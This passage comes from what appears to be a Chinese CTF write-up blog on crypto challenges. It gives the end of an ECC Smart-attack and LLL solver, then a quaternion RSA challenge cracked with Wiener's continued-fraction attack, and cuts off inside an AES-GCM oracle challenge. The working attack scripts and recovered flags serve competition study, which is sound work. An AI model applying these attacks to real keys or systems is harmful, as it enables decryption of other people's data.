class="number">200</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        G = E.lift_x(GF(p)(x_cand))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Computing Discrete Logs (Smart Attack)...&quot;</span>)</span><br><span class="line">v = vector(GF(p), [smart_attack(G, E(bi), p) <span class="keyword">for</span> bi <span class="keyword">in</span> b_pts])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 构造格并使用 LLL 寻找选择路径 c</span></span><br><span class="line">A_mat = matrix(GF(p), <span class="number">137</span>, <span class="number">73</span>, A_list)</span><br><span class="line"><span class="comment"># 构造扩展矩阵 [A | 1] (137x74)</span></span><br><span class="line">M_ext = A_mat.augment(matrix(GF(p), [<span class="number">1</span>]*<span class="number">137</span>).transpose())</span><br><span class="line"><span class="comment"># 寻找左核，维度约为 137 - 74 = 63</span></span><br><span class="line">K = M_ext.left_kernel().basis_matrix()</span><br><span class="line">kv = K * v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消除 delta，构造关于二进制向量 c 的方程 R * c = 0 mod p</span></span><br><span class="line">rows = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K.nrows()):</span><br><span class="line">    row = [(kv[i]*K[<span class="number">0</span>, j] - kv[<span class="number">0</span>]*K[i, j]) % p <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">137</span>)]</span><br><span class="line">    rows.append(row)</span><br><span class="line"></span><br><span class="line">num_eqs = <span class="built_in">len</span>(rows) <span class="comment"># 约 62</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Building Lattice with <span class="subst">&#123;num_eqs&#125;</span> relations...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的格构造：</span></span><br><span class="line"><span class="comment"># 维度：(num_eqs + 137) x (num_eqs + 137)</span></span><br><span class="line">L = matrix(ZZ, num_eqs + <span class="number">137</span>, num_eqs + <span class="number">137</span>)</span><br><span class="line"><span class="comment"># 1. 模 p 关系部分</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">    L[i, i] = p</span><br><span class="line"><span class="comment"># 2. 变量系数部分 (Knapsack-like)</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">137</span>):</span><br><span class="line">    row_idx = num_eqs + j</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">        L[row_idx, i] = rows[i][j]</span><br><span class="line">    L[row_idx, num_eqs + j] = <span class="number">1</span> <span class="comment"># 权重设为 1，因为 c_i 是 0 或 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Running LLL...&quot;</span>)</span><br><span class="line">L_red = L.LLL()</span><br><span class="line"></span><br><span class="line">c_vec = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> L_red:</span><br><span class="line">    <span class="comment"># 提取后 137 位</span></span><br><span class="line">    cand = row[-<span class="number">137</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(x == <span class="number">0</span> <span class="keyword">or</span> x == <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> cand) <span class="keyword">and</span> <span class="built_in">any</span>(x != <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> cand):</span><br><span class="line">        c_vec = vector(GF(p), cand)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(x == <span class="number">0</span> <span class="keyword">or</span> x == -<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> cand) <span class="keyword">and</span> <span class="built_in">any</span>(x != <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> cand):</span><br><span class="line">        c_vec = vector(GF(p), [-x <span class="keyword">for</span> x <span class="keyword">in</span> cand])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c_vec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 还原秘密并解密</span></span><br><span class="line"><span class="comment"># 方程：v = [A | 1 | c] * [s_1...s_73, L(e0), delta]^T</span></span><br><span class="line">M_final = A_mat.augment(matrix(GF(p), [<span class="number">1</span>]*<span class="number">137</span>).transpose()).augment(matrix(GF(p), c_vec).transpose())</span><br><span class="line">sol = M_final.solve_right(v)</span><br><span class="line">s_vals = sol[:<span class="number">73</span>]</span><br><span class="line"></span><br><span class="line">s_points = [ZZ(si) * G <span class="keyword">for</span> si <span class="keyword">in</span> s_vals]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 key</span></span><br><span class="line"><span class="comment"># Sage 的 str(list) 会输出 [(x : y : 1), ...] 格式，需与题目加密时环境一致</span></span><br><span class="line">key = md5(<span class="built_in">str</span>(s_points).encode()).digest()</span><br><span class="line">cipher = AES.new(key=key, nonce=<span class="string">b&quot;LWECC&quot;</span>, mode=AES.MODE_CTR)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>flag{48c17d955e0f3e16ddbc2fdebeea55}</strong></p>
<p>这题梭出来了一血::smiley:</p>
<ul>
<li>ComCompleXX</li>
</ul>
<blockquote>
<p>I’ve recently become obsessed with math, but this problem seems really comcomplexx. Can you help me?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">p, q, e, d = key</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> p.bit_length() == <span class="number">512</span> <span class="keyword">and</span> q.bit_length() == <span class="number">512</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d_len:&#x27;</span>, d.bit_length())</span><br><span class="line"><span class="comment"># d_len: 500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QN</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, n</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a % n</span><br><span class="line">        <span class="variable language_">self</span>.b = b % n</span><br><span class="line">        <span class="variable language_">self</span>.c = c % n</span><br><span class="line">        <span class="variable language_">self</span>.d = d % n</span><br><span class="line">        <span class="variable language_">self</span>.n = n</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, QN) <span class="keyword">and</span> <span class="variable language_">self</span>.n == other.n:</span><br><span class="line">            n = <span class="variable language_">self</span>.n</span><br><span class="line">            a1, b1, c1, d1 = <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d</span><br><span class="line">            a2, b2, c2, d2 = other.a, other.b, other.c, other.d</span><br><span class="line">            a = (a1*a2 - b1*b2 - c1*c2 - d1*d2) % n</span><br><span class="line">            b = (a1*b2 + b1*a2 + c1*d2 - d1*c2) % n</span><br><span class="line">            c = (a1*c2 - b1*d2 + c1*a2 + d1*b2) % n</span><br><span class="line">            d = (a1*d2 + b1*c2 - c1*b2 + d1*a2) % n</span><br><span class="line">            <span class="keyword">return</span> QN(a, b, c, d, n)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NotImplemented</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, exp</span>):</span><br><span class="line">        <span class="keyword">if</span> exp &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> QN(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.n)</span><br><span class="line">        result = QN(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.n)</span><br><span class="line">        base = <span class="variable language_">self</span></span><br><span class="line">        <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">                result = result * base</span><br><span class="line">            base = base * base</span><br><span class="line">            exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;self.a&#125;</span>, <span class="subst">&#123;self.b&#125;</span>, <span class="subst">&#123;self.c&#125;</span>, <span class="subst">&#123;self.d&#125;</span>)&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a == other.a <span class="keyword">and</span> <span class="variable language_">self</span>.b == other.b <span class="keyword">and</span> </span><br><span class="line">                <span class="variable language_">self</span>.c == other.c <span class="keyword">and</span> <span class="variable language_">self</span>.d == other.d <span class="keyword">and</span> <span class="variable language_">self</span>.n == other.n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = QN(bytes_to_long(flag), random.randint(<span class="number">1</span>,n-<span class="number">1</span>), random.randint(<span class="number">1</span>,n-<span class="number">1</span>), random.randint(<span class="number">1</span>,n-<span class="number">1</span>), n)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(c,d) == m</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 85481717157593593434025329804251284752138281740610011731799389557859119300838454555657179864017815910265870318909961454026714464920305413622061116245330661303912116693461205161551044610609272231860357133575507519403908786715597649351821576114881230052647979679534076432015415470679178775688932706964062378627</span></span><br><span class="line"><span class="string">e = 622349328830189017262721806176220642327451718814004869262654184548169579851269489422592218838968239824917128227573062775020729663341881800222644869706115998147909113383905386637703321110321003518025501597602036772247509043126119242571435842445265921450671551669304835480011469949693693324643919337459251944818821206437044742271947245399811180478630764346756372873090874700249814285609571282905316777766489385036566372369518133091334281269104669836052038324087775082397535339943512028851288569342237442241378961242047171826362264504999955091800815867645003788806864324904993634075730184915611726197403247247938385732000097424282851846018331719216174462481994636142469669316961566262677169345291992925101965060785779535371861314213957527417556275049382603735394888681049143483994633920712406197215676594926797093225468201559158552767178665382859062516627874818691572997614241454801824762125841557409876879638813879540588189811</span></span><br><span class="line"><span class="string">c = (36509962693210047517809190780500733945629638467721636016118307831299153205787169088399018032858962653944360359037757238416729623515314461908869670066385367461579954207170900898502608201371741903312247217007567631584237670049543882850246347784852813361080564895289678219739976819925055830837232548960336550804, 14959247128290207711158598578966149380261887381574636597156641284189267790471920774170808806288580563577492441070024491886953389517733477847472737986545246252874395600374486543947605977380365673302757291495953658030048738906460472042379676160137626447499571382731894905380992263233204548600668812780247601325, 36653805985529315558503796353782648503316310086826701482263862429608379730584363732938416744191295088641419179725673205148217999183797829423539295825286947419128575063946728227807922575922697370871241826105471260524875137135999213015948866472957081351066130709476717779611974377854714476824268335455979590736, 44619982799889884704010277482810139576960205880619960462167175653326841572868809642692412859814472796539211092403704130039198480671655784971458045667408446084843398171460450068014922244839889367385992492875980531522963147513445040259751323986442839404788429909271285196520486381047903450020895598546088952188)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>四元数的常识需要有</p>
<p><img src="/images/QianJianTec1767188553168.png" alt=""></p>
<script type="math/tex; mode=display">
n=pq \\
ed\equiv1\ (mod\ \phi(n)) \\
M=bytes\_to\_long(flag) \\
r_1,r_2,r_3\leftarrow[1,n-1] \\
m=M+r_1i+r_2j+r_3k=(M,r_1,r_2,r_3) \\
c=m^e \\</script><p>此处$d≈n^{0.5}$,Wiener攻击按理来说有可能失效，但是尝试后发现成功了</p>
<p><img src="/images/QianJianTec1767188585075.png" alt=""></p>
<script type="math/tex; mode=display">
\frac{e}{n}≈\frac{k}{d} \\
\frac{e}{n}=a_0+\frac{1}{a1+\frac{1}{a2+\frac{1}{a3+\frac{1}{...}}}} \\
p_{-2}=0,p_{-1}=1 \\
q_{-2}=1,q_{-1}=0 \\
p_i=a_ip_{i-1}+p_{i-2} \\
q_i=a_iq_{i-1}+q_{i-2} \\</script><p>$\frac{p_i}{q_i}$称为收敛子，通过递推实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n = <span class="number">85481717157593593434025329804251284752138281740610011731799389557859119300838454555657179864017815910265870318909961454026714464920305413622061116245330661303912116693461205161551044610609272231860357133575507519403908786715597649351821576114881230052647979679534076432015415470679178775688932706964062378627</span></span><br><span class="line">e = <span class="number">622349328830189017262721806176220642327451718814004869262654184548169579851269489422592218838968239824917128227573062775020729663341881800222644869706115998147909113383905386637703321110321003518025501597602036772247509043126119242571435842445265921450671551669304835480011469949693693324643919337459251944818821206437044742271947245399811180478630764346756372873090874700249814285609571282905316777766489385036566372369518133091334281269104669836052038324087775082397535339943512028851288569342237442241378961242047171826362264504999955091800815867645003788806864324904993634075730184915611726197403247247938385732000097424282851846018331719216174462481994636142469669316961566262677169345291992925101965060785779535371861314213957527417556275049382603735394888681049143483994633920712406197215676594926797093225468201559158552767178665382859062516627874818691572997614241454801824762125841557409876879638813879540588189811</span></span><br><span class="line">c_tuple = (<span class="number">36509962693210047517809190780500733945629638467721636016118307831299153205787169088399018032858962653944360359037757238416729623515314461908869670066385367461579954207170900898502608201371741903312247217007567631584237670049543882850246347784852813361080564895289678219739976819925055830837232548960336550804</span>, <span class="number">14959247128290207711158598578966149380261887381574636597156641284189267790471920774170808806288580563577492441070024491886953389517733477847472737986545246252874395600374486543947605977380365673302757291495953658030048738906460472042379676160137626447499571382731894905380992263233204548600668812780247601325</span>, <span class="number">36653805985529315558503796353782648503316310086826701482263862429608379730584363732938416744191295088641419179725673205148217999183797829423539295825286947419128575063946728227807922575922697370871241826105471260524875137135999213015948866472957081351066130709476717779611974377854714476824268335455979590736</span>, <span class="number">44619982799889884704010277482810139576960205880619960462167175653326841572868809642692412859814472796539211092403704130039198480671655784971458045667408446084843398171460450068014922244839889367385992492875980531522963147513445040259751323986442839404788429909271285196520486381047903450020895598546088952188</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># QN 类定义（用于解密）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QN</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, n</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a % n</span><br><span class="line">        <span class="variable language_">self</span>.b = b % n</span><br><span class="line">        <span class="variable language_">self</span>.c = c % n</span><br><span class="line">        <span class="variable language_">self</span>.d = d % n</span><br><span class="line">        <span class="variable language_">self</span>.n = n</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, QN) <span class="keyword">and</span> <span class="variable language_">self</span>.n == other.n:</span><br><span class="line">            n = <span class="variable language_">self</span>.n</span><br><span class="line">            a1, b1, c1, d1 = <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d</span><br><span class="line">            a2, b2, c2, d2 = other.a, other.b, other.c, other.d</span><br><span class="line">            a = (a1*a2 - b1*b2 - c1*c2 - d1*d2) % n</span><br><span class="line">            b = (a1*b2 + b1*a2 + c1*d2 - d1*c2) % n</span><br><span class="line">            c = (a1*c2 - b1*d2 + c1*a2 + d1*b2) % n</span><br><span class="line">            d = (a1*d2 + b1*c2 - c1*b2 + d1*a2) % n</span><br><span class="line">            <span class="keyword">return</span> QN(a, b, c, d, n)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NotImplemented</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, exp</span>):</span><br><span class="line">        <span class="keyword">if</span> exp &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> QN(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.n)</span><br><span class="line">        result = QN(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.n)</span><br><span class="line">        base = <span class="variable language_">self</span></span><br><span class="line">        <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">                result = result * base</span><br><span class="line">            base = base * base</span><br><span class="line">            exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;self.a&#125;</span>, <span class="subst">&#123;self.b&#125;</span>, <span class="subst">&#123;self.c&#125;</span>, <span class="subst">&#123;self.d&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连分数算法（Wiener&#x27;s Attack 基础）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fractions</span>(<span class="params">n, d</span>):</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        q = n // d</span><br><span class="line">        <span class="keyword">yield</span> q</span><br><span class="line">        n, d = d, n % d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents</span>(<span class="params">n, d</span>):</span><br><span class="line">    <span class="comment"># 生成 convergents (num, den) 即 (k, d)</span></span><br><span class="line">    <span class="comment"># p_&#123;-2&#125;=0, p_&#123;-1&#125;=1, q_&#123;-2&#125;=1, q_&#123;-1&#125;=0</span></span><br><span class="line">    p0, p1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    q0, q1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> continued_fractions(n, d):</span><br><span class="line">        p0, p1 = p1, q * p1 + p0</span><br><span class="line">        q0, q1 = q1, q * q1 + q0</span><br><span class="line">        <span class="keyword">yield</span> p1, q1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Trying Wiener&#x27;s Attack using convergents of e/n...&quot;</span>)</span><br><span class="line">    <span class="comment"># k/d 是 e/N 的 convergent</span></span><br><span class="line">    <span class="keyword">for</span> k, d <span class="keyword">in</span> convergents(e, n):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查 d 的长度是否符合题目描述 (500 bits)</span></span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == <span class="number">500</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Candidate d found with length <span class="subst">&#123;d.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            c_qn = QN(c_tuple[<span class="number">0</span>], c_tuple[<span class="number">1</span>], c_tuple[<span class="number">2</span>], c_tuple[<span class="number">3</span>], n)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                m_qn = <span class="built_in">pow</span>(c_qn, d)</span><br><span class="line">                flag_long = m_qn.a</span><br><span class="line">                flag_bytes = long_to_bytes(flag_long)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag_bytes <span class="keyword">or</span> <span class="string">b&#x27;ctf&#123;&#x27;</span> <span class="keyword">in</span> flag_bytes.lower() <span class="keyword">or</span> <span class="string">b&#x27;Complex&#x27;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted Flag: <span class="subst">&#123;flag_bytes&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p><strong>flag{Qu4t3rNion<em>l5_S0_6rea7</em>&amp;_Ch4rm1n9}</strong></p>
<ul>
<li>POC</li>
</ul>
<blockquote>
<p>Easy AES Challenge</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracleClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="variable language_">self</span>.auth = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="variable language_">self</span>.nonces = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.update(nonce=os.urandom(<span class="number">12</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, nonce: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">assert</span> nonce <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.nonces, <span class="string">&quot;Nonce Reuse Detected&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.nonces.add(nonce)</span><br><span class="line">        <span class="variable language_">self</span>.nonce = nonce</span><br><span class="line">        <span class="variable language_">self</span>.cnt = <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self, username: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]:</span><br><span class="line">        <span class="keyword">assert</span> <span class="variable language_">self</span>.cnt, <span class="string">&quot;Out of Services&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.cnt -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        aes = AES.new(<span class="variable language_">self</span>.key, AES.MODE_GCM, nonce=<span class="variable language_">self</span>.nonce)</span><br><span class="line">        aes.update(<span class="variable language_">self</span>.auth)</span><br><span class="line">        tok, en = aes.encrypt_and_digest(pad(username, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> tok+en</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self, token: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="variable language_">self</span>.cnt, <span class="string">&quot;Out of 